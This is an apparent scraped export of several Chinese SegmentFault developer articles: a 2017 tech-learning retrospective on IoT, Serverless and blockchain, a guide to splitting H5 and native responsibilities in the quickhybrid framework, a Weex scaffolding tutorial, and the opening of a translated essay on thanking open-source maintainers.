<p>对于一个技术人员来说，这个流程就比较简单了。通常来说，作为一个初入这个行业几年的 “新人” 来说，我们是没有经验、能力去开扩一个新的领域。这时成为早期投资者，可能就是最早期的选择了。</p>
<p>在新技术的早期就采用它，<strong>是一件相当有风险的事，也可能会有相当大的收益</strong>。新技术在早期充满了不确认性，如果你押错了，那么你在这段时间的时间可能就白费了。因此，一般是到一个新的技术、概念出现一段时间后，去填这些相关的坑。</p>
<p>如我在这一年进入 Serverless 的坑一样，虽然有一些晚，但是好在国内的云服务产商的服务还不怎么行。通过使用感受、社区及 Google Trends 来看，来看看是否押错地方。</p>
<h3>在光明期前采用</h3>
<p>通常意味着，这个新技术栈还有很多坑。但是，大家都认可它是一个有前途的技术。如在今年被大规模采用（淘宝、QQ 等，有一些因为版权已经换坑了）的 React Native 就是一个很好的例子。</p>
<p>一般来说，经历了一些大公司的踩坑，以及网上的一些踩坑经验，那么就意味着采用它已经没有多少问题了——前提是你已经做好了技术储备。这个时候你就可以为了今年的 KPI，去说服你的领导了。我们应该这么做，xx 公司都已经上线了，而且这些 blabla 的优势很明显。</p>
<h3>跟随项目使用</h3>
<p>当一个新技术的采用，已经在市场上达成共识。那么，也不要再采用旧的技术了。</p>
<p>到了今天，前端的<strong>单页面应用</strong>已经是 React、Angular、Vue 的天下了。这时要开发一个<strong>复杂的前端应用</strong>，那么你应该从这些主流的框架中去选择，而不是采用早期、过期（已经不维护）的技术了。除非，你们是一家大公司，有自己的轮子。</p>
<p>当然，只在该用某技术的时候，才在项目上使用新技术。对于一些简单的页面，jQuery + Bootstrap 还是万能的。为了使用新技术，而在项目上使用，有时候容易造成问题。</p>
<h2>物联网与去中心化</h2>
<p>在这一年里，为 InfoQ 编写《物联网周报》的时候，我花费了大量的时间在索引互联网上的 IoT 相关内容。随之也翻译了一系列的文章，也有了 “<a href=""https://www.wandianshenme.com"" rel=""nofollow noreferrer"">玩点什么</a>” 网站 、APP和小程序，其目的主要用于储备技术。通过翻译一些物联网及前沿的技术实践——<strong>持续关注某一领域，可以通过翻译相关的文章来投资</strong>。将一些国内没有的，又可能在未来用到的技术翻译成了中文，再增加一些提升 SEO 提名的文章。（PS：因为在我的<a href=""https://www.phodal.com"" rel=""nofollow noreferrer"">技术博客</a>）上，650+ 的博客大部分都是原创的技术笔记，所以不打算放在我的博客上——同时，也可以避免版权带来的问题。）</p>
<p>除了，我大学学的电子信息工程；还有一点，硬件是虚拟世界与现实世界的接口，而物联网则可以让我们真实的、从远程访问世界的各个角落。于是，在年中的时候，我花费时间去研究各式各样的智能家居系统，也有了我的 <a href=""https://github.com/phodal/smart-home"" rel=""nofollow noreferrer"">smart-home</a> 项目。</p>
<p><strong>当自己擅长的技术，有一些新的突破，那么就应该去学习它。</strong></p>
<p>2017 年里，IoT 领域的技术趋势，已经在不断地结合各种时髦的技术，如：</p>
<ul>
<li><a href=""https://www.wandianshenme.com/play/serverless-framework-aws-build-serverless-garden-monitoring-system/"" rel=""nofollow noreferrer"">Serverless Framework 与 AWS IoT 构建 Serverless 的花园监控系统</a></li>
<li><a href=""https://www.wandianshenme.com/play/use-golang-docker-build-go-application-on-raspberry-pi/"" rel=""nofollow noreferrer"">Raspberry Pi 教程：在 Docker 上使用 Go 点亮 LED</a></li>
<li><a href=""https://www.wandianshenme.com/play/raspberry-pi-build-home-lab-serverless-kubernetes/"" rel=""nofollow noreferrer"">Raspberry Pi 与 OpenFaaS 构建 Serverless Kubernetes 集群</a></li>
<li><a href=""https://www.wandianshenme.com/play/tensorflow-keras-build-lane-following-auto-car/"" rel=""nofollow noreferrer"">Raspberry Pi 自动驾驶：使用 Keras 与 Tensorflow 构建车道跟踪自动汽车</a></li>
</ul>
<p>他们解决了一些嵌入式设备的自身缺陷，不过在一年里，<strong>安全仍然是这方面的主流考虑</strong>。</p>
<blockquote>当一个流行的技术能在 PC 上运行，它也终将在智能手机、Raspberry Pi 这一类小型计算设备上运行。</blockquote>
<p>在数字化浪潮不断扩张的今天，物联网作为一个底层的技术合集，越来越受关注。但是，这不意味着它会马上火爆起来，只是我们可以看到它在不断地被<strong>应用</strong>。</p>
<p>在这上面花时间，不一定有收益，但是总觉得<strong>自己改变了什么</strong>。</p>
<h2>AI 与技术成熟度</h2>
<p>AI 火热的这一年，在为玩点什么做应用的过程中，便想结合一些机器学习的技术。所以我又复习了一下机器学习，顺便打算 GET 一下深度学习的技能。也就有了玩点什么的<a href=""https://www.phodal.com/blog/how-to-design-a-recommend-system-part-1-statistics-rating-up/"" rel=""nofollow noreferrer"">推荐系统</a> ，也应用上了 jieba 分词，加上之前对于朴素贝叶斯、聚类等的研究。发现一般的机器学习，对于我这种已经远离高等数学的人来说，还不算太难，概念上基本能理解得差不多——主要是这些算法，都能应用到一些真实的场景。</p>
<p>于是，我打算试水一下深度学习。然后，我发现我 TM 的数据都没有，下载个数据都要半天。再看看书上的理论，我发现我抽不到足够的空余时间来学习——我的意思是，<strong>足够集中的学习时间</strong>。还有一个问题是，没有<strong>数据</strong>——尽管网上已经有大量的公开数据，但是这些公开数据多数是英语的。这些基于英语语言的数据，会导致出现的算法以英语为主，导致算法本身难以采用，这一类问题最常见于 NLP（自然语言学习）。</p>
<p>假使我将一个周末的两天 + 每天三个小时的晚上时间都投在上面，那么从短期来看收益太少——我可以花这些时间，强化我在其它领域的知识。</p>
<p>好在深度学习的 API，也很容易上手。这一点与我之间在试水智能音箱有点类似，实现一个简单的智能音箱本身并不需要太多的新算法——利用一些现有的公开 API、公开算法，我们可以轻松也用深度学习做一个音箱。但是我们缺乏足够的音频数据，它将会导致我们无法进入下一步。</p>
<p>这就是为什么 Mozilla 会推出 Common Voice Project 项目的原因，没有足够的财力就不会有足够的数据；同理于，今年阿里在双 11 送的大量 99 元的天猫精灵一样，只有大量的数据才能造出 AI。<strong>只能有足够的数据或者财富，才能拥有与之匹配的人工智能</strong>。</p>
<h2>Serverless 与事件驱动</h2>
<p>在第四个季度里，我花费了大量的时间在学习 Serverless 系统，编写大量的 Serverless 应用。有兴趣的同学可以了解 <a href=""https://www.phodal.com/blog/serverless-architecture-what-is-serverless-architecture/"" rel=""nofollow noreferrer"">花了 1000G，我终于弄清楚了 Serverless 是什么</a>，以及基于 Serverless 架构的 <a href=""https://github.com/phodal/molog"" rel=""nofollow noreferrer"">简单日志系统 molog</a>、<a href=""https://github.com/phodal/moform"" rel=""nofollow noreferrer"">表单系统 moform</a>，这些 Serverless 应用都可以在一天内开发、上线。</p>
<p>Serverless 事件驱动的特性，使得它适合物联网、人工智能、数据分析等场景。其按需付费，又能让我愉快地（毕竟穷）各种 Serverless 应用。</p>
<p>如上所示，Serverless 将是一种新的技术架构趋势。而 Serverless 本身算不上一个新的技术，只是 FaaS 结合一堆现有的技术组成的技术架构。因此我将学习 Serverless 的行为，定义为<strong>一种 “短平快” 的学习投资</strong>。</p>
<p>由于国内的内容匮乏，我采用的策略是：边写 DEMO，边写文章、编写自己的 Serverless 应用、写一系列的总结文章、整理成电子书。这样一来在 2018 年，我的博客可能就会受长尾效应的影响，带来额外的更多流量。</p>
<h2>区块链评估</h2>
<p>我对区块链采用的是评估，也就是还没有进入我的采用、Demo 期——主要是因为区块链技术采用的领域有限。早期我在思考在边缘计算、物联网领域引入，但是场景有限。不过，在未来我应该会尝试引入这个技术的。</p>
<p><strong>常规的物联网系统都是中心化的</strong>，采集数据、加工数据、存储数据、可视化数据、预测数据，它也不需要担心中间的数据修改。如果以一个传感器采集点，作为一个节点，采用区块链的存储成本过高。如果以一个区域作为结点，它也不需要担心其它结点的数据的修改问题。</p>
<p><strong>只当每一个节点自身需要记录变更</strong>的时候，那么这个物联网应用才适合采用区块链技术，如物流场景等等。</p>
<p>又或者是，在你的智能家居系统的每一个控制节点上，都记录每一次控制的变化。如你使用手机控制了台灯的开和关，这个数据就会同步到你的手机上。问题是，控制个灯都需要记录一下的场景，这可能是监狱吧？</p>
<p>或许，我还需要一个区块链的 markdown 同步工具，而不是使用 GitHub 或者各种云笔记。这样我的 <a href=""https://github.com/phodal/markdown-improve"" rel=""nofollow noreferrer"">markdown-improve</a> 计划，又多了一个新的成员了。</p>
<h2>结论</h2>
<p>从上述的学习经历来看，学习技术的期限主要是：</p>
<ul>
<li>短期学习未来将采用的技术</li>
<li>中期了解一些新的技术知识</li>
<li>长期接触自己喜欢的技术</li>
</ul>
<p>不过，简单的来说，这一年的经验就是：</p>
<ul>
<li><strong>持续关注某一领域，可以通过翻译相关的文章来投资</strong></li>
<li><strong>当自己擅长的技术，有一些新的突破，那么就应该去学习它。</strong></li>
<li><strong>如果一个与自己工作相关的技术是未来的趋势，那么请拥抱它。</strong></li>
<li><strong>如果有一个新的技术可以影响到你的生活，不妨去学学它。</strong></li>
</ul>

                ", 2017 年节点——我的技术投资学习策略：超越前端、物联网、事件驱动,1531971903,226,1,516,1,1,https://segmentfault.com/a/1190000012729621
34,1,0,6,"
                    
<h2>前言</h2>
<p>在JSBridge实现后，前端网页与原生的交互已经通了，接下来就要开始规划API，明确需要提供哪一些功能来供前端调用。</p>
<p>但是在这之前，还有一点重要工作需要做：</p>
<p><strong>明确H5与Native的职责划分，确定哪一些功能可以由H5实现，哪一些功能只能由原生实现</strong></p>
<h2>Native与H5职责划分</h2>
<p>使用Hybrid模式，用H5开发页面的本质是：</p>
<p><strong>减少工作量（一套代码，多个平台），以及快速的更新迭代（譬如线上更新），而且还需要考虑Native端的高性能以及系统API调用能力（否则直接用纯H5就可以了）</strong></p>
<p>因此在进行职责划分时，就得充分的考虑前端渲染，JS语言以及原生渲染，Java/OC等语言的特性，__基本总结如下：__</p>
<ul>
<li>混合页面导航栏组件由原生实现</li>
<li>一些重要的业务页面、带有复杂动画或交互的页面以及一些固定页面由原生实现</li>
<li>系统级UI由原生统一实现</li>
<li>页面切换的转场由原生实现</li>
<li>CPU密集型任务、底层的优化要由原生完成</li>
<li>其它功能能用H5实现（并且效果不错）的就尽量不要用原生</li>
</ul>
<h2>导航栏组件由Native实现</h2>
<p>尝试过，也对比过很多的混合开发框架，譬如Dcloud的HTML5+，钉钉里的DD API，自己也尝试过不同的方式，<br>最终发现导航栏的最好做法还是由原生提供，核心原因如下：</p>
<ul><li>__H5页面加载过程会有白屏问题（也别是弱网络情况）__，如果整个页面都是H5实现，那么白屏了就体验非常差，而且连基本的交互与操作都没了</li></ul>
<p>仅基于这一点，就已经拍板了由Native导航栏组件+webview（加载H5）来组成页面，而原生提供一些API来供网页操控导航栏（譬如标题，按钮等）</p>
<p>整体页面布局如下：</p>
<p><span class=""img-wrap""><img data-src=""https://quickhybrid.github.io/staticresource/images/layout_navbar.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>而H5端可以通过原生提供的API来操控导航栏，以下举例为quick中规划的API:</p>
<pre><code class=""js"">// 仅提供一部分示例
quick.navigator.setTitle({
    title: '标题',
    subTitle: '子标题',
    success: function(result) {},
    error: function(error) {}
});

quick.navigator.setRightBtn({
    isShow: 1,
    text: '按钮右1',
    // 设置图片的优先级会较高
    //imageUrl: 'http://xxx/test.png',
    // 从右数起第几个
    which: 0,
    success: function(result) {
        /**
         * 按钮点击后回调
         */
    },
    error: function(error) {}
});</code></pre>
<h3>多tab页面也由原生提供</h3>
<p>实际开发中Native导航栏组件+webview也就满足绝大部分的页面需求了，但是还有一些特殊页面是这种实现达不到的，譬如多Tab页面</p>
<p><span class=""img-wrap""><img data-src=""https://quickhybrid.github.io/staticresource/images/layout_navtabbar.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>上述这种内含多tab的页面，每一个tab里都是单独的页面，而且可以通过滑动等手势来切换，甚至tab还会有一些渐变动画，导航栏也配合改变等（常见于APP首页）</p>
<p>为了统一实现，这类页面的导航栏与底部tab均是由原生实现，由H5通过API打开这类原生页面，并将需要加载的网页地址传入，如下</p>
<pre><code class=""js"">quick.page.openLocal({
    className: '那种原生页面的标识，可以唯一查询到相应的界面',
    data: {
        // 需要加载的n个url
        url1: 'http://...',
        urln: 'http://...',
    },
    success: function(result) {},
    error: function(error) {}
});</code></pre>
<p>然后，在每一个前端页面（webview里加载的内容），可以分别在对于页面的脚本里进行自己的交互控制</p>
<h2>重要的业务页面由原生实现</h2>
<p>对于一些重要的业务页面，如登陆，注册，支付等，处于安全性以及交互性的考虑（就是一个APP的门面），会采用完全由Native实现<br>（当然了，一般这些页面的变动频率也不大）</p>
<p><span class=""img-wrap""><img data-src=""https://quickhybrid.github.io/staticresource/images/layout_login.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>一些默认提示页面采用原生实现</h3>
<p>webview加载网页时，一般情况原生都是会对加载情况进行监听的，比如是否网络异常。服务器响应异常，页面加载崩溃等，<br>为了防止APP假死，原生会提高一些默认提示页面</p>
<p><span class=""img-wrap""><img data-src=""https://quickhybrid.github.io/staticresource/images/layout_specialtips1.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>上述只是一个原型示例，实际上，很多情况都可以由原生提供统一提示页面，<br>如404，页面崩溃，网络错误等</p>
<h3>交互性强、动画复杂的页面采用原生实现</h3>
<p>除了关键性页面，还有一类，就是H5不好实现的（或者说达不到要求的、实现代价过大的），也应该由原生实现</p>
<p>譬如以某图像处理软件某个界面截图为例</p>
<p><span class=""img-wrap""><img data-src=""https://quickhybrid.github.io/staticresource/images/layout_complex.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>这种页面涉及到了明显不太适合H5实现的图像处理，因此原生才是更佳的选择（当然了，实际上H5的canvas是由图像处理能力的）</p>
<h2>系统级UI由原生统一实现</h2>
<p>前面提到了页面的选择，但页面内的内容也是需要抉择的，比如一些UI显示控件（alert，toast等）</p>
<p>虽然H5完成可以实现这些UI控件，并且可以和原生模拟的一样，但是基于以下考虑，所有系统级的UI全部由原生实现并提供API:（原生和H5需统一风格）</p>
<ul>
<li>每一个合格的原生应用本身就会有一套自己风格的UI，因此不存在重复开发问题</li>
<li>H5本身可以实现这些组件，但是如果要模拟的和原生一摸一样的话代价并不小，而且体验并不能完全接近原生（比如遮罩无法覆盖导航栏）</li>
<li>如果是原生提供的，更改风格时原生改掉就行了，其它无效变动，如果H5单独维护一套，那么就被迫一起同步，平白新增很多的工作量</li>
<li>而且H5还会存在一些坐标、尺寸计算偏差问题</li>
</ul>
<p>一般情况下H5通过如下API即可调用</p>
<pre><code class=""js"">quick.ui.toast('xxxx');
quick.ui.alert('xxxx');

quick.ui.alert({
    title: ""标题"",
    message: ""信息"",
    buttonName: ""确定"",
    success: function(result) {
        // 点击 alert的按钮后回调
    },
    error: function(err) {}
});</code></pre>
<p><span class=""img-wrap""><img data-src=""https://quickhybrid.github.io/staticresource/images/layout_ui_alert.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>页面切换的转场由原生实现</h2>
<p>一般PC浏览器中，页面之间的调整直接通过<code>a标签</code>完成（或者改变<code>href</code>跳转），<br>但是这种跳转有一个缺点：</p>
<p><strong>无法使用转场动画，每次都是干巴巴的等浏览器加载进度条，体验很差</strong></p>
<p>因此针对这种情况，原生需要提供特点的API来供页面调用，可以有原生转场动画，在新的webview中打开这个页面</p>
<pre><code class=""js"">quick.page.open({
    pageUrl: ""./xxx.html"",
    data: {
        // 额外传递的数据
        key1: 'value1'
    },
    success: function(result) {},
    error: function(error) {}
});</code></pre>
<p>采用这种方式打开的页面不再是在本webview中跳转，而是直接用新的webview打开，有过渡动画，而且以前的页面仍然存在内存中，接近原生体验</p>
<p>譬如</p>
<pre><code class=""js"">页面A -&gt; 页面B -&gt; 页面C</code></pre>
<p><span class=""img-wrap""><img data-src=""https://quickhybrid.github.io/staticresource/images/layout_multiwebview.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>可以看到，如果是直接调整，页面A和B是不存存在的，而是会被替换，但是采用原生webview打开后，三个页面同时存在</p>
<h3>仍然支持第三方页面的href跳转</h3>
<p>虽然说可以有API打开的增强方式，但是仍然需要支持href跳转，这在集成第三方页面时十分重要（将已经写好的第三方纯网页集成到容器中，作为某个子模块）</p>
<p>这里有一点需要注意：</p>
<pre><code class=""js"">这类页面一般由a标签或href跳转直接打开，没有转场动画，但是需要webview容器保存访问历史记录，
以避免多次跳转后一个后退就直接退出了整个模块</code></pre>
<h2>CPU密集型任务、底层的优化要由原生完成</h2>
<p>当涉及到一些大量计算时，尽量避免直接在网页端完成，而是应该由原生提供API完成。</p>
<p>譬如对一张图片进行图像处理（曝光、水印、压缩等等），如果直接由网页完成的话会发现非常卡，发热也严重，而原生则没有这么多的问题</p>
<p>关于底层优化，__其实整套混合开发框架中，底层容器的实现是核心部分__</p>
<p>容器是否健壮，优化的如何，直接影响整个应用的体验</p>
<p>关于原生容器应该如何进行优化，后续会有专门的文章，这里不赘述，只是稍微提及一下：</p>
<ul>
<li>支持H5页面的离线访问（有线上版本和离线版本，通过本地路由表映射）</li>
<li>离线资源动态更新（结合离线访问一起，比较复杂）</li>
<li>资源缓存（如图片的缓存，脚本样式的缓存等）</li>
<li>统一数据埋点采样等（手机应用使用数据）</li>
<li>ajax请求等等（还有很多，不一一列举）</li>
</ul>
<h2>能用H5实现的就尽量不要用原生</h2>
<p>接下来就是在实际开发过程遵循的准则：</p>
<ul><li>能用H5实现的就尽量不要用原生</li></ul>
<p>乍看之下可能和上述的有矛盾，但其实又是合理的，在排除了一些不适合H5实现的页面，剩余的绝大部分都是普通的业务页面，<br>这类页面基本可以毫无压力的采用H5。</p>
<p>所以，这时候，第一想法都是采用H5完成（因为一套代码可以在至少三个平台运行-浏览器，Android，iOS），<br>遇到一些比较困难的页面再去考虑原生实现（从开发效率上，维护代价上，更新方便上都比较麻烦）</p>
<p><strong>那些H5开发中遇到最多的页面</strong></p>
<p>最后，看下实际开发过程中遇到的最多的页面吧（以实际遇到的<code>N</code>个项目的总结）</p>
<ul>
<li>列表页面（下拉刷新，加载更多）</li>
<li>纯详情展示页面（标题，关键字，内容）</li>
<li>九宫格首页</li>
<li>图片轮播（时常结合列表和九宫格）</li>
<li>标准的表单提交页面</li>
</ul>
<p>没错，<code>80%</code>都是上述这种可以算非常简单的页面。</p>
<p>譬如封装过一个下拉刷新组件，基本别人基于这个组件来开发，列表的代码几乎是千篇一律。（当然了，剥离了业务逻辑而言）</p>
<h2>结束语</h2>
<p>时至今日，<code>Hybrid</code>模式已经过了它最火的时候，市面上也出现如<code>weex</code>，<code>react-native</code>等直接写原生组件的框架，<br>但是，现在使用最多，应用最广的仍然要属这种传统的Hybrid模式，它已经进入了稳定期（可以说，传统H5开发（泛概念）不被APP淘汰，这种模式很难被挤下舞台）</p>
<h2>返回根目录</h2>
<ul><li><a href=""https://github.com/quickhybrid/quickhybrid/issues/12"" rel=""nofollow noreferrer"">【quickhybrid】如何实现一个Hybrid框架</a></li></ul>
<h2>源码</h2>
<p><code>github</code>上这个框架的实现</p>
<p><a href=""https://github.com/quickhybrid/quickhybrid"" rel=""nofollow noreferrer"">quickhybrid/quickhybrid</a></p>
<h2>附录</h2>
<h3>参考资料</h3>
<ul><li><a href=""https://segmentfault.com/a/1190000004263182"" rel=""nofollow noreferrer"">Hybrid APP架构设计思路</a></li></ul>

                ", 【quickhybrid】H5和原生的职责划分,1531971905,439,1,665,1,1,https://segmentfault.com/a/1190000012580870
35,1,0,6,"
                    
<p>写在前面的话：</p>
<pre><code>注意！该文档是2017年年底的文章，那个时候weex还有很多问题，现在weex已经全面更新，文档也比较全。下面的讲解可能不太适应新的weex框架，后面我会再立贴讲解。谢谢各位关注。

weex官方文档不完善，在整个实施过程中遇到过很多坑，中途几次想放弃，总是有些不甘心。攻坚克难，总也是会有一些收获，先将收获进行分享也或是记录，防止忘记。要想用好weex必须对es5/es6基础，vue体系，打包工具webpack有较深的了解；对ios，android有了解。</code></pre>
<p>官方提供的weex脚手架不能指定入口文件，如果我们想要在项目中使用vuex,vue-router，没有入口文件将会变得比较复杂。那么该如何搭建具有入口文件的脚手架呢？首先，我们先把官方提供的脚手架使用一下，然后再其基础上进行修改</p>
<p>一. 初始化weex项目</p>
<pre><code>$ weex init helloweex</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0WiY?w=1774&amp;h=274"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span><br> 二. 安装依赖包</p>
<pre><code>$ cd helloweex
$ npm install
或者可以使用淘宝镜像安装
$ cnpm install

**注意！如果使用npm安装依赖，建议先手动创建node_modules目录再进行安装，避免后期出现权限不足的问题**
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wjb?w=1790&amp;h=230"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span><br> 三. 在浏览器中进行测试</p>
<pre><code>注意！在浏览器中显示成功并不意味着在本地就可以显示成功！因为这是两个不同的执行环境。
$ npm run serve
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wjh?w=1780&amp;h=624"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span><br> 四. 此时会遇到第一个坑</p>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wjq?w=1786&amp;h=330"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>原因：</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0WjE?w=2198&amp;h=882"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>https://www.npmjs.com/package/uglifyjs-webpack-plugin
   
解决方案：
1）安装 uglifyjs-webpack-plugin
    $ cnpm i -D uglifyjs-webpack-plugin
2) 应用
    const UglifyJsPlugin = require('uglifyjs-webpack-plugin')
    module.exports = {
      plugins: [
        new UglifyJsPlugin()
      ]
    }</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wj2?w=1916&amp;h=690"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>3) 重新部署，不再报错！
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wlv?w=1566&amp;h=926"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>五. 模拟器上运行</p>
<pre><code>如果之前步骤可以完成，只能说明当前代码在浏览器上可以执行，能不能本地运行还需要再进行测试。要想本地测试必须安装模拟器（ios或android），本文章不提供具体的安装过程，如有需要，请自行查看其它文章。
本章以ios环境为例进行测试
依次执行如下命令
1) 安装ios平台
    $ weex platform add ios        </code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0WkO?w=1784&amp;h=244"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>2) 安装依赖
    $ cd platforms/ios
    $ pod install
    </code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wk1?w=1780&amp;h=1112"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>3) 运行
    $ cd ../..
    $ weex run ios (次过程较慢，需等待一会)
4) 选择运行环境后启动模拟器</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0WlY?w=1780&amp;h=1112"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/bV0WnX?w=780&amp;h=1518"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>六. 编写代码</p>
<pre><code>查看webpack.config.js得知会，该脚手架会根据src下vue文件产生一个对应的.js文件存放到demo目录下，但是传统的vue开发，我们都希望有个入口文件（main.js或者entry.js）,然后在该文件中导入其他模块，进行页面的总体配置等操作。
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Woi?w=1282&amp;h=802"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span><br>那么，我们应该如何使得当前项目具有入口文件呢？答案是只能修改webpack.config.js文件。</p>
<pre><code>1）添加入口文件配置
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0WoQ?w=1884&amp;h=390"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>2) 删除多余配置信息
删除getEntryFileContent函数
删除walk函数
删除walk() walk函数的调用
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wpf?w=1876&amp;h=790"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>3) 在src目录下添加主vue,App.vue
    </code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wqk?w=1186&amp;h=778"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>4) 在src目录下添加入口文件entry.js，并且删除temp目录

</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wqv?w=1538&amp;h=464"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>5) 在浏览器中进行测试
    $ npm run serve
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0WqA?w=1222&amp;h=444"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>6) 在ios模拟器上进行测试
    $ weex run ios
    </code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Ww0?w=780&amp;h=1518"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>    
7) 如果发现打包后的文件不叫index.js可以修改webpack.config.js
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0WtD?w=1370&amp;h=618"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code>8）解决页面无法覆盖整个屏幕的问题
需要在原生代码中进行简单的修改
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wxo?w=2024&amp;h=844"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/bV0Wxx?w=688&amp;h=1326"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>

                ", weex踩坑之旅第一弹 ~ 搭建具有入口文件的weex脚手架,1531971907,443,1,851,1,1,https://segmentfault.com/a/1190000012579051
36,1,0,6,"
                    
<blockquote><ul>
<li>原文地址：<a href=""https://www.codementor.io/windsonyang/why-we-never-thank-open-source-maintainers-ed0nsw3zd"" rel=""nofollow noreferrer"">Why we never thank open source maintainers</a>
</li>
<li>原文作者：<a href=""https://www.codementor.io/windsonyang"" rel=""nofollow noreferrer"">Windson Yang</a>
</li>
<li>译文出自：<a href=""https://github.com/xitu/gold-miner"" rel=""nofollow noreferrer"">掘金翻译计划</a>
</li>
<li>本文永久链接：<a href=""https://github.com/xitu/gold-miner/blob/master/TODO/why-we-never-thank-open-source-maintainers.md"" rel=""nofollow noreferrer"">https://github.com/xitu/gold-miner/blob/master/TODO/why-we-never-thank-open-source-maintainers.md</a>
</li>
<li>译者：<a href=""https://leviding.com"" rel=""nofollow noreferrer"">LeviDing</a>
</li>
</ul></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012575337?w=700&amp;h=276"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>你现在可以到 <a href=""https://www.thankyouopensource.com"" rel=""nofollow noreferrer"">Thank you, open source</a> 这个网站上为你最喜欢的开源项目写一句感谢的话了。</p>
<h4>Long Version</h4>
<p>下面是我对为什么我们从来不去感谢开源项目维护者的一些看法。</p>
<h4>这样的项目我也可以做啊</h4>
<blockquote>“蛤？这项目对我来说也太简单了吧。”<p>“我一周之内就能做一个更好的版本出来。”</p>
</blockquote>
<p>确实，很多人都可以在黑客马拉松（hackathon）中建一个小工具，但是维护一个项目比建立一个项目要困难得多。开源项目维护者不仅仅需要写代码，更多时候还需要：</p>
<ul>
<li>写项目文档；</li>
<li>检查 Pull Request；</li>
<li>看看大家提的 Issue；</li>
<li>为项目增加新功能；</li>
<li>在 Stack Overflow 等平台回答关于本项目的问题；</li>
<li>在 QQ、微信等用户群里和用户讨论，回答问题。</li>
</ul>
<p>一个开源项目维护者必须一年到头无偿地做这么多复杂繁琐的工作。</p>
<h4>当我们很方便的使用开源项目时，太容易忘记项目维护者的辛苦付出了</h4>
<p>我们如何使用一个开源项目：</p>
<ol>
<li>我们在网上搜索遇到的问题的解决方案；</li>
<li>在一些博客和其他网站上进行搜索；</li>
<li>我们点击这个开源项目的链接，读项目的 README。安装并进行测试。哈哈哈，问题解决了！</li>
